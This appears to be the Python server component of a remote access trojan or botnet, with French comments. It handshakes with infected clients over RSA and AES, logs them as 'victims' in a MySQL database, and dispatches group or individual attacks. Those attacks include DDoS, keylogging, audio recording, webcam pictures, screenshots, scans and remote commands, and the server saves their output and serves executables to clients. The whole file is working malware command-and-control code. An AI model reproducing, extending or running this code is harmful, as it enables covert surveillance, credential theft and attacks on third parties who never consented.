import argparse
import os
import mysql.connector
import json
import socket
import select
import threading
import rsa
import base64
import re
import logging

from env import *
from database import *
from network import *
from functions import *
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from queue import Queue, Empty




def start_server(port, logger):
    clients = []

    # Socket
    host = "0.0.0.0"
    port = port

    socket_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    socket_server.setblocking(0)
    socket_server.bind((host, port))
    socket_server.listen()
    print("ecoute sur : " + str(host) + ":" + str(port))
    logger.info("ecoute sur : " + str(host) + ":" + str(port))


    connection_list = [socket_server]

    # Database
    db = mysql.connector.connect(
        host=DBHOST,
        user=DBUSER,
        password=DBPASSWORD,
        database=DB
    )


    mycursor = db.cursor()

    running = True


    while running:
        # print("[+] server is running")

        db.cmd_refresh(1)

        read_sockets, write_sockets, error_sockets = select.select(connection_list, [], connection_list, 3)


        for sock in read_sockets:
            # Nouvelle connexion
            if sock is socket_server:
                conn, addr = sock.accept()


                # Handshake
                print("(+) handshake with " + str(addr))
                logger.info("(+) handshake with " + str(addr))

                # Récupération de la clé publique du client (451 octets)
                public_key = rsa.PublicKey.load_pkcs1_openssl_pem(conn.recv(451))

                # Génération de la clé symétrique
                sym_key = get_random_bytes(16)
                iv = get_random_bytes(16)

                json_conf = '{"action":"' + base64.b64encode("client_config".encode()).decode() + '","b64symetric":"' + base64.b64encode(sym_key).decode() + '","b64iv":"' + base64.b64encode(iv).decode() + '","multithread":true,"stealth":true}'

                # Chiffrement de la data avec la clé publique du client
                encrypted_sym_key = rsa.encrypt(json_conf.encode(), public_key)

                # Envoi de la clé symétrique chiffrée (256 octets)
                conn.sendall(encrypted_sym_key)

                print("[+] Waiting for client handshake informations")
                logger.info("attente des informations de handshake du client")

                # Réception de la configuration du client (96 octets)
                received_data = conn.recv(96)

                cipher = AES.new(sym_key, AES.MODE_CBC, iv=iv)
                pt = unpad(cipher.decrypt(received_data), AES.block_size).decode('utf-8')
                print("\t(+) config received")
                logger.info("configuration reçue : " + pt)

                # Récupération de l'uid client
                uid = json.loads(pt)["uid"]
                client_os = json.loads(pt)["os"]

                print("\t(+) uid : " + str(uid))
                logger.info("uid du client : " + str(uid))


                # Ajout de la victime en base de données
                add_victim_to_db(db, mycursor, uid, client_os, addr[0], sym_key, "testupdated")


                # Création des threads d'émission et de réception
                emission_queue = Queue()
                thread_emission = threading.Thread(target=emission, args=(emission_queue, conn, addr, sym_key, iv))
                thread_emission.start()

                reception_queue = Queue()
                thread_reception = threading.Thread(target=reception, args=(reception_queue, conn, addr, sym_key, iv, logger))
                thread_reception.start()
                

                # Ajout du client à la liste des clients
                clients.append(dict(addr = addr, 
                                    conn = conn, 
                                    thread_emission = thread_emission, 
                                    emission_queue = emission_queue, 
                                    thread_reception = thread_reception, 
                                    reception_queue = reception_queue, 
                                    sym_key = sym_key, 
                                    iv = iv,
                                    uid = uid,
                                    os = client_os
                                ))


        
        # Récupération des attaques de groupe à lancer
        attacks = get_group_attacks(mycursor)

        # print("[?] retreiving group attacks")
        # print("\t[+] " + str(len(attacks)) + " attack(s) found")
        

        for attack in attacks:
            print("[+] executing attack :")
            print("\t {}", str(attack))
            logger.info("lancement de l'attaque : " + str(attack) +" sur le groupe : " + str(attack[1]))

            # Récupération des ordinateurs du groupe
            query = "SELECT uid FROM victims WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = %s)"
            values = (attack[1], )

            mycursor.execute(query, values)
            victims_uid = mycursor.fetchall()


            attack_sent = False
            number_of_attackers = 0

            for victim_uid in victims_uid:
                if is_attacking(mycursor, victim_uid):
                    print("[!] delaying attack, client is already attacking")
                    logger.info("attaque retardée, la victime est déjà attaquée")

                else :
                    for client in clients:
                        if client['uid'] == victim_uid[0]:
                            execute_attack(client, attack, logger)
                            attack_sent = True
                            number_of_attackers += 1

            
            # Mise à jour de l'attaque si elle a été envoyée au moins une fois
            if attack_sent:
                query = "UPDATE group_attacks SET state = 'running', executed_rate = %s WHERE id = %s"
                exec_rate = str(number_of_attackers) +"/" + str(len(victims_uid))
                values = (exec_rate, attack[0], )

                mycursor.execute(query, values)

                db.commit()



            ##############################################################
        

        # Récupération des attaques individuelles à lancer
        attacks = get_victim_attacks(mycursor)

        # print("[?] retreiving victim attacks")
        # print("\t[+] " + str(len(attacks)) + " attack(s) found")
        

        for attack in attacks:

            # Récupération des données de l'attaque
            data = json.loads(attack[4])
            
            # Récupération des ordinateurs du groupe
            query = "SELECT uid FROM victims WHERE id = %s"
            values = (attack[1], )

            mycursor.execute(query, values)

            victim_uid = mycursor.fetchall()[0][0]

            print("[+] executing attack :" + str(attack))
            print("[+] victim uid : " + str(victim_uid))

            # Vérification qu'on récupère un uid
            if victim_uid :
                for client in clients:
                    if client['uid'] == victim_uid:
                        if is_attacking(mycursor, victim_uid):
                            print("[!] delaying attack, client is already attacking")
                            logger.info("attaque retardée, la victime est déjà attaquée")

                        else :
                            print("[+] executing victim attack :")
                            print("\t[+]", str(attack[2]))
                            logger.info("lancement de l'attaque : " + str(attack) +" sur la victime : " + str(victim_uid))
                            
                            try:
                                execute_attack(client, attack, logger)
                                logger.info("lancement de l'attaque : " + str(attack) +" sur la victime : " + str(victim_uid))
                            except Exception as e:
                                logger.error("erreur lors de l'envoi de l'attaque : " + str(attack) +" sur la victime : " + str(victim_uid) + " : " + str(e))

                            # Mise à jour de l'attaque
                            query = "UPDATE victim_attacks SET state = 'running' WHERE id = %s"
                            values = (attack[0], )

                            mycursor.execute(query, values)

                            db.commit()
            
        #######################

        # Gestion des clients
        print("[+] " + str(len(clients)) + " client(s) connected")

        for client in clients:
            # Récupération des données clients

            try:
                client_data = client['reception_queue'].get(timeout=1)

                # Check si le client s'est deconnecté
                if client_data == b'disconnected':
                    print("[-] client disconnected " + str(client['addr']))
                    logger.info("client déconnecté : " + str(client['addr']))

                    # Mise à jour du statut dans la base de données
                    update_status(db, mycursor, client['uid'])

                    # On exit les attaques en cours
                    exit_attacks(db, mycursor, client['uid'])

                    # Arrêt du thread d'émission
                    client['emission_queue'].put(b"stop-thread")

                    clients.remove(client)
                    continue

                
                # Chargement du message en json
                # Demande d'executable {"request":"XXX"}
                # Retour d'attaque : {"id":"XXX","attack":"XXX","output":"XXX"}

                client_message = json.loads(re.sub('\n', '', client_data.decode()))

                if "request" in client_message:
                    # envoyer l'executable au client
                    try:
                        send_executable_to_client(client_message["request"], client['os'], client['sym_key'], client['iv'], client['reception_queue'], client['emission_queue'], logger)
                        logger.info("envoi de l'executable : " + client_message["request"] + " au client : " + str(client['uid']))
                    except Exception as e:
                        print("[-] error while sending executable to client : " + str(e))
                        logger.error("erreur lors de l'envoi de l'executable : " + client_message["request"] + " au client : " + str(client['uid']) + " : " + str(e))

                elif "attack" in client_message :
                    # interpreter le resultat de l'attaque
                    attack_type = client_message["attack"]
                    attack_id = client_message["id"]
                    attack_output = client_message["output"]

                    # Mise à jour de l'attaque
                    if attack_type == "ddos":
                        print("DDOS UPDATED")
                        query = "UPDATE victim_attacks SET state = 'done', result = 'done' WHERE id = %s"
                        values = (attack_id, )

                    else :
                        # Vérification de l'existence du dossier pour y mettre le resultat de l'attaque
                        if not os.path.exists(ROOT_PATH + "results/" + str(attack_type) + "/" + str(client['uid']) + "/"):
                            os.makedirs(ROOT_PATH + "results/" + str(attack_type) + "/" + str(client['uid']) + "/")
                        
                        # Choix du nom du fichier de résultat (extension différente selon le type d'attaque)
                        if attack_type == "record":
                            result_file_name = ROOT_PATH + "results/" + str(attack_type) + "/" + str(client['uid']) + "/" + str(attack_id) + ".wav"
                        elif attack_type == "picture" or attack_type == "screenshot" or attack_type == "monitor":
                            result_file_name = ROOT_PATH + "results/" + str(attack_type) + "/" + str(client['uid']) + "/" + str(attack_id) + ".png"
                        elif attack_type == "scan" or attack_type == "keylogger" or attack_type == "command":
                            result_file_name = ROOT_PATH + "results/" + str(attack_type) + "/" + str(client['uid']) + "/" + str(attack_id) + ".txt"
                        
                        # Ecriture du résultat dans le fichier
                        with open(result_file_name, "wb") as f:
                            f.write(base64.b64decode(attack_output))

                        # Mise à jour de l'attaque dans la base de données
                        query = "UPDATE victim_attacks SET state = 'done', result = %s WHERE id = %s"
                    
                        values = (result_file_name, attack_id, )

                        
                    mycursor.execute(query, values)

                    db.commit()

                    logger.info("attaque : " + str(attack_id) + " terminée")
                    print("[+] attack updated in the database (done !)")


            except Empty:
                pass
